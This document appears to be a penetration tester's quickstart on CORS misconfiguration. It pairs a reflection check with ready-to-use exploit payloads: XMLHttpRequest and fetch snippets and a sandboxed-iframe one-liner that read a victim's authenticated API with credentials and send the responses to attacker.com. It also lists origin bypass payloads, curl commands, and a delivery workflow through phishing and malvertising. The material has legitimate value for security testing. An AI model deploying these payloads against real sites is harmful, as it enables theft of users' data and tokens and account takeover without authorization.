# CORS Quickstart

Rapid CORS misconfiguration testing. Full reference: `cors-cheat-sheet.md`.

## Critical headers

- `Access-Control-Allow-Origin` — which origins can access
- `Access-Control-Allow-Credentials` — whether cookies/auth are allowed
- `Origin` — browser-set request origin (cannot be spoofed in browsers, but spoofable in cURL)

## 60-second check

1. Login, find authenticated endpoint with sensitive data.
2. Burp Repeater:
   ```http
   GET /api/userdata HTTP/1.1
   Host: victim.com
   Origin: https://evil.com
   Cookie: session=abc123
   ```
3. Response check:
   ```
   Access-Control-Allow-Origin: https://evil.com   ← reflected
   Access-Control-Allow-Credentials: true          ← critical
   ```
4. Both → EXPLOITABLE.

**Not exploitable when**: `ACAO: *` (no credentials), `ACAC` absent/false, or strict static allowlist.

## Origin payloads to try

```
https://evil.com                 — arbitrary
null                             — null origin (sandboxed iframe)
http://victim.com                — protocol downgrade
https://attacker.victim.com      — subdomain trust
https://victim.com.evil.com      — suffix bypass (no end-anchor regex)
https://evilsvictim.com          — prefix match
https://victimXcom               — dot-as-wildcard regex
file://victim.com                — file protocol
```

## Exploit payloads

### Basic data theft
```javascript
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api/data', true);
req.withCredentials = true;
req.onload = function() {
    fetch('https://attacker.com/log?data=' + btoa(this.responseText));
};
req.send();
```

### POST action
```javascript
var req = new XMLHttpRequest();
req.open('post', 'https://victim.com/api/action', true);
req.withCredentials = true;
req.setRequestHeader('Content-Type', 'application/json');
req.onload = () => fetch('https://attacker.com/log?r=' + this.responseText);
req.send(JSON.stringify({ action: 'malicious' }));
```

### Minimal one-liner
```html
<script>fetch('https://victim.com/api',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/?data='+btoa(d)))</script>
```

### Null origin via sandbox
```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://victim.com/api',{credentials:'include'}).then(r=>r.text()).then(d=>parent.postMessage(d,'*'))</script>"></iframe>
```

Sandbox tip: `allow-scripts allow-same-origin` keeps parent origin (NOT null). Use `allow-scripts allow-top-navigation` for null origin.

## Workflow

1. **Recon**: proxy login, find endpoints returning user data, API keys, tokens, account details, admin actions.
2. **Confirm**: Burp Repeater with `Origin: https://evil.com` → check reflection + `ACAC: true` + sensitive body.
3. **Build exploit**: host JS on attacker server (above payloads).
4. **Deliver**: phishing, malvertising, compromised site, XSS chain on trusted domain.

## Bypass techniques

- **Sandbox null origin**: `<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="...">` produces `Origin: null`.
- **File protocol**: trick user to open local HTML; some servers trust `null` origin.
- **Data URL**: `<iframe src="data:text/html,<script>...</script>">` also yields null origin.
- **Regex bypass**: target `/victim\.com/` → `victim.com.attacker.com` (no `$`), `attackervictim.com` (no `^`), `victimXcom` (unescaped `.`).
- **Subdomain takeover**: register abandoned subdomain (S3, GitHub Pages, Heroku app) → host exploit on trusted-by-CORS subdomain.
- **XSS on trusted origin**: if `subdomain.victim.com` trusted, find XSS there → use it to issue same-origin requests.

## Common mistakes

- Forgot `withCredentials = true` → cookies not sent.
- Forgot `encodeURIComponent` on exfil → response data with `&`/`=` corrupts URL.
- `sandbox="allow-scripts allow-same-origin"` → parent origin sent, not null.
- Tested origin reflection but didn't check `ACAC: true` (no creds = no exploit).

## cURL one-liners

```bash
# Reflection check
curl -H "Origin: https://evil.com" -H "Cookie: session=abc" -i https://victim.com/api

# Null origin
curl -H "Origin: null" -H "Cookie: session=abc" -i https://victim.com/api

# Preflight
curl -X OPTIONS -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: DELETE" \
     -i https://victim.com/api
```

## Risk

- CVSS v3.1: 8.1–9.3 (HIGH–CRITICAL). `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`
- Impact: account takeover, API key/token theft, privilege escalation, business-logic bypass.

## Pro tips

1. Always test **with credentials** — CORS without creds is rarely exploitable.
2. Check `Vary: Origin` — missing it on cacheable responses → cache poisoning.
3. Test all protocols: HTTP, HTTPS, file://, data:, null.
4. Enumerate subdomains; XSS + CORS chains are common.
5. Don't forget internal networks: 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12.
6. Preflight (OPTIONS) for non-simple requests — test both flows.
7. Look for missing `^`/`$` in origin regex.
8. Use `btoa()` for binary-safe data exfil.
